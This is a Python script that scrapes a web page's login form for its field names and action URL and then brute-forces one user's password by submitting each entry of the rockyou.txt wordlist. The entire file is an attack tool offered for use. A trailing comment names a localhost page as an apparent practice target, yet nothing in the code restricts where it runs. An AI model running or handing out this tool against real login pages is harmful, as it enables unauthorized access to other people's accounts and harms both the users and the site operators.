import requests
from bs4 import BeautifulSoup
import argparse
from termcolor import colored

parser = argparse.ArgumentParser()
parser.add_argument('-url', '--url')
args = parser.parse_args()

url = args.url

url_without_last = url[:url.rindex("/")+1]

soup = BeautifulSoup(requests.post(url).text, 'html.parser')
possible_id = soup.findAll("input")

for i in range(0,len(possible_id)):
    if "password" in str(possible_id[i]):
        password_id = i
        username_id = password_id-1
        possible_id[password_id] = str(possible_id[password_id])
        possible_id[username_id] = str(possible_id[username_id])
        equal = possible_id[password_id].index("name=") + 6
        equal2 = possible_id[username_id].index("name=") + 6
        break

for j in range(equal2, len(possible_id[username_id])):
    if possible_id[username_id][j] == '"':
        usr_id = possible_id[username_id][equal2:j]
        print("Parametro nome: " + str(usr_id))
        break

for j in range(equal, len(possible_id[password_id])):
    if possible_id[password_id][j] == '"':
        pssw_id = possible_id[password_id][equal:j]
        print("Parametro password: " + str(pssw_id))
        break

possible_id = soup.findAll("form")

for i in range(0, len(possible_id)):
    if "action=" in str(possible_id[i]):
        possible_id[i] = str(possible_id[i])
        position_action = i
        redirect_id = possible_id[i].index("action=") + 8

for i in range(redirect_id, len(possible_id[position_action])):
    if possible_id[position_action][i] == '"':
        action_url = possible_id[position_action][redirect_id:i]
        break

new_url = url_without_last+action_url

print("Parametro url redirecionado: " + str(new_url))

def login(username, password):
    r = requests.post(new_url, data={
        usr_id: username,
        pssw_id: password,
        "submit": "login"
    })
    return r

passwords = open("rockyou.txt", "r")

confirmation = input("Does this information seem correct?(yes/no)")

if confirmation == "yes":
    userBrute = input("What user do you want me to try?")
    fakePass = login(userBrute, "a").text
    for i in passwords:
        i = i.replace("\n", "")
        asd = login(userBrute, i).text
        print(colored(f"[*] Trying {i} [*]", color="red"))
        if asd != fakePass:
            print(colored(f"[*] Password Found: {i} [*]", color="green"))
            break
            #"http://localhost/MyStuff/Login.php"